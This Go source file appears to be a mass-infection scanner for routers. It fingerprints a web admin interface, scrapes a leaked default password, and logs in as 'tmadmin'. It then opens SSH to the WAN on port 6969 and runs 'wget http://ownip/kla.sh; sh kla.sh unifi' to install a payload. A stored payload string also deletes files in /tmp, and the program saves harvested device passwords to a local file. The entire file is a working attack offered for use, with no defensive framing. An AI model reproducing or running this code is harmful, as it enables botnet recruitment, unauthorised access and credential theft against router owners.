package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"errors"
	"flag"
	"fmt"
	"io"
	"net"
	"net/url"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/crypto/ssh"
)

const (
	Payload     = "cd /tmp; rm -rf *; wget http://ownip/kla.sh; sh kla.sh unifi"
	ExecMessage = "For God"
)

var (
	Port      = "null"
	Separator = ","
	Tls       = false

	WaitGroup sync.WaitGroup

	Processed int
	Found     int
	Logins    int
	SshLogins int
	Exploited int

	config = &tls.Config{
		MinVersion:         tls.VersionTLS10,
		InsecureSkipVerify: true,
	}

	dialer = &net.Dialer{Timeout: 15 * time.Second}
)

func StringBetween(input, start, end string) (string, error) {
	startIndex := strings.Index(input, start)
	if startIndex == -1 {
		return "", fmt.Errorf("start string not Found")
	}
	startIndex += len(start)
	endIndex := strings.Index(input[startIndex:], end)
	if endIndex == -1 {
		return "", fmt.Errorf("end string not Found")
	}
	return input[startIndex : startIndex+endIndex], nil
}

func DialTimeout(target string) (net.Conn, error) {
	if Tls {
		return tls.DialWithDialer(dialer, "tcp", target, config)
	} else {
		return net.DialTimeout("tcp", target, 15*time.Second)
	}
}

// extractBody extracts the data after \r\n\r\n
func extractBody(rawResponse []byte) ([]byte, error) {
	headerEnd := bytes.Index(rawResponse, []byte("\n"))
	if headerEnd == -1 {
		return nil, fmt.Errorf("no headers found in response")
	}

	bodyStart := headerEnd + 2
	return rawResponse[bodyStart:], nil
}

// extractCredentials extracts all needed credentials
func extractCredentials(data string) (telnetUser, telnetPass string) {
	var err error

	telnetUser, err = StringBetween(data, "SUSER_NAME\" Value=\"", "\"")
	if err != nil {
		return
	}

	telnetPass, err = StringBetween(data, "SUSER_PASSWORD\" Value=\"", "\"")
	if err != nil {
		return
	}

	return
}

func verifyDevice(target string) (string, error) {
	conn, err := DialTimeout(target)
	if err != nil {
		return "", err
	}

	var request = []byte("GET / HTTP/1.1\r\n" +
		"Host: " + target + "\r\n" +
		"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36\r\n" +
		"Referer: http://" + target + "/cgi-bin/index2.asp\r\n\r\n")

	_, _ = conn.Write(request)

	bytes, err := io.ReadAll(conn)
	if err != nil {
		return "", err
	}

	if !(strings.Contains(string(bytes), "SESSIONID") || strings.Contains(string(bytes), "text/html") || strings.Contains(string(bytes), "/cgi-bin/index2.asp")) {
		return "", errors.New("not yipee")
	}

	return StringBetween(string(bytes), "SESSIONID=", ";")
}

// extractPassword attempts to verify the device before exploiting
func extractPassword(target string) (string, string, error) {
	conn, err := DialTimeout(target)
	if err != nil {
		return "", "", err
	}

	defer conn.Close()
	conn.SetReadDeadline(time.Now().Add(15 * time.Second))

	_, _ = conn.Write([]byte("GET /cgi-bin/index2.asp HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Hello World\r\n\r\n"))

	data, err := io.ReadAll(conn)
	if err != nil {
		return "", "", err
	}

	if !strings.Contains(string(data), "ServerLanIP") {
		return "", "", errors.New("not boa")
	}

	if !strings.Contains(string(data), "defaultPassword") {
		return "", "", errors.New("no default password")
	}

	// get token
	token, err := StringBetween(string(data), "TOKEN=", ";")
	if err != nil {
		return "", "", err
	}

	// cut off to defaultPassword str
	elementId := bytes.Index(data, []byte("(elementId == \"defaultPassword\")"))
	if elementId == -1 {
		return "", "", errors.New("no default password")
	}

	data = data[elementId:]

	defaultPassword, err := StringBetween(string(data), "str = '", "'")
	if err != nil {
		return "", "", err
	}

	return defaultPassword, token, nil
}

// Login attempts to log in to the device
func Login(target, username, password, token, sid string) bool {
	conn, err := DialTimeout(target)
	if err != nil {
		return false
	}

	defer conn.Close()
	conn.SetReadDeadline(time.Now().Add(15 * time.Second))

	body := "token=" + token + "&Username=" + username + "&Logoff=0&hLoginTimes=1&hLoginTimes_Zero=0&value_one=1&Password1=" + url.QueryEscape(password) + "&Password2=" + url.QueryEscape(password) + "&logintype=usr&LanIP=192.168.1.1&Ipv6LanIP=fe80%3A%3A1&AccessIP=" + strings.Split(target, ":")[0] + "&Password=" + url.QueryEscape(password) + "&Password_text=" + url.QueryEscape(password)
	_, _ = conn.Write([]byte("POST /cgi-bin/index2.asp HTTP/1.1\r\n" +
		"Host: " + target + "\r\n" +
		"Content-Type: application/x-www-form-urlencoded\r\n" +
		"Content-Length: " + strconv.Itoa(len(body)) + "\r\n" +
		fmt.Sprintf("Cookie: UID=%s; PSW=%s; SESSIONID=%s;\r\n", username, password, sid) +
		"User-Agent: Hello World\r\n\r\n" +
		body))

	data, err := io.ReadAll(conn)
	if err != nil {
		return false
	}

	response := string(data)
	if !strings.Contains(response, "var Logged = 0;") {
		return false
	}

	// TODO
	return true
}

func CheckLogin(target, user, pass, sid string) error {
	conn, err := DialTimeout(target)
	if err != nil {
		return err
	}

	defer conn.Close()
	conn.SetReadDeadline(time.Now().Add(15 * time.Second))

	var request = []byte("GET /cgi-bin/content.asp HTTP/1.1\r\n" +
		"Host: " + target + "\r\n" +
		"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36\r\n" +
		fmt.Sprintf("Cookie: UID=%s; PSW=%s; SESSIONID=%s\r\n", user, pass, sid) +
		"Referer: http://" + target + "/cgi-bin/index2.asp\r\n\r\n")

	_, _ = conn.Write(request)

	bytes, err := io.ReadAll(conn)
	if err != nil {
		return err
	}

	if strings.Contains(string(bytes), "401 Unauthorized") {
		return errors.New("not yipee")
	}

	return nil
}

func RetrieveTelnetToken(target, user, pass, sid string) (string, error) {
	conn, err := DialTimeout(target)
	if err != nil {
		return "", err
	}

	defer conn.Close()
	conn.SetReadDeadline(time.Now().Add(15 * time.Second))

	var request = []byte("GET /cgi-bin/sec-acl.asp HTTP/1.1\r\n" +
		"Host: " + target + "\r\n" +
		"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36\r\n" +
		fmt.Sprintf("Cookie: UID=%s; PSW=%s; SESSIONID=%s\r\n", user, pass, sid) +
		"Referer: http://" + target + "/cgi-bin/index2.asp\r\n\r\n")

	_, _ = conn.Write(request)

	bytes, err := io.ReadAll(conn)
	if err != nil {
		return "", err
	}

	return StringBetween(string(bytes), "TOKEN=", ";")
}

func EnableSSH(target, user, pass, sid, token string) error {
	conn, err := DialTimeout(target)
	if err != nil {
		return err
	}

	defer conn.Close()
	conn.SetReadDeadline(time.Now().Add(15 * time.Second))

	body := "token=" + token + "&lanHttpEnable=on&wanHttpEnable=on&wanHttpPort=80&lanHttpsEnable=on&wanHttpsEnable=on&wanHttpsPort=443&lanSSHEnable=on&wanSSHEnable=on&wanSSHPort=6969&lanPingEnable=on&wanPingEnable=on&wanTelnetPort=1337&wan_http_Flag=1&wan_ping_Flag=1&wan_telnet_Flag=0&wan_https_Flag=1&wan_ssh_Flag=1&wan_ftp_Flag=0&wan_tftp_Flag=0&wan_snmp_Flag=0&lan_http_Flag=1&lan_ping_Flag=1&lan_telnet_Flag=1&lan_https_Flag=1&lan_ssh_Flag=1&lan_ftp_Flag=0&lan_tftp_Flag=0&lan_snmp_Flag=0&Fire_IPv4_Flag=1&CurrentSelectedMenu=Security-%3EACL-%3EWAN+Access"

	var request = []byte("POST /cgi-bin/sec-acl.asp HTTP/1.1\r\n" +
		"Host: " + target + "\r\n" +
		"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36\r\n" +
		"Content-Type: application/x-www-form-urlencoded\r\n" +
		"Content-Length: " + strconv.Itoa(len(body)) + "\r\n" +
		fmt.Sprintf("Cookie: UID=%s; PSW=%s; SESSIONID=%s; TOKEN=%s\r\n", user, pass, sid, token) +
		"Referer: http://" + target + "/\r\n\r\n" + body)

	_, _ = conn.Write(request)

	bytes, err := io.ReadAll(conn)
	if err != nil {
		return err
	}

	if strings.Contains(string(bytes), "401 Unauthorized") {
		return errors.New("not yipee")
	}

	return nil
}

func InfectViaTelnet(target, username, password string) bool {
	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         30 * time.Second,
	}

	client, err := ssh.Dial("tcp", strings.Split(target, ":")[0]+":6969", config)
	if err != nil {
		return false
	}

	defer client.Close()

	session, err := client.NewSession()
	if err != nil {
		return false
	}

	defer session.Close()

	SshLogins++

	output, err := session.CombinedOutput("wget http://ownip/kla.sh; sh kla.sh unifi")
	if err != nil {
		return false
	}

	if strings.Contains(string(output), "FINISH") {
		Exploited++
	}

	return true
}

func Process(target string) {
	WaitGroup.Add(1)
	defer WaitGroup.Done()

	Processed++

	sessionId, err := verifyDevice(target)
	if err != nil {
		return
	}

	password, token, err := extractPassword(target)
	if err != nil {
		return
	}

	Found++

	// log the found device so we can track/manually infect
	f, _ := os.OpenFile("/root/unifi_found.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if f != nil {
		fmt.Fprintf(f, "%s %s\n", target, password)
		f.Close()
	}

	// login the device
	if !Login(target, "tmadmin", password, token, sessionId) {
		return
	}

	// check if we logged in
	if err := CheckLogin(target, "tmadmin", password, sessionId); err != nil {
		return
	}

	Logins++

	// retrieve telnet token
	token, err = RetrieveTelnetToken(target, "tmadmin", password, sessionId)
	if err != nil {
		return
	}

	// enable ssh
	EnableSSH(target, "tmadmin", password, sessionId, token)
	EnableSSH(target, "tmadmin", password, sessionId, token)
	EnableSSH(target, "tmadmin", password, sessionId, token)

	time.Sleep(30 * time.Second)

	fmt.Println("Infecting", target, password)
	InfectViaTelnet(target, "tmadmin", password)
}

func titleWriter() {
	timeStarted := time.Now()

	for {
		fmt.Printf("%.0fs -> Processed: %d -> Found: %d -> Logins: %d -> SSH Logins: %d -> Exploited: %d -> Routines: %d\n",
			time.Since(timeStarted).Seconds(),
			Processed,
			Found,
			Logins,
			SshLogins,
			Exploited,
			runtime.NumGoroutine(),
		)

		time.Sleep(1 * time.Second)
	}
}

func main() {
	flag.StringVar(&Port, "port", "null", "Specify the port to connect to")
	flag.StringVar(&Separator, "separator", ",", "Port separator")
	flag.BoolVar(&Tls, "tls", false, "Enable TLS for the connection")
	flag.Parse()

	go titleWriter()

	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		if Port == "null" {
			go Process(strings.ReplaceAll(scanner.Text(), Separator, ":"))
			continue
		}

		go Process(scanner.Text() + ":" + Port)
	}

	time.Sleep(10 * time.Second)
	WaitGroup.Wait()
}
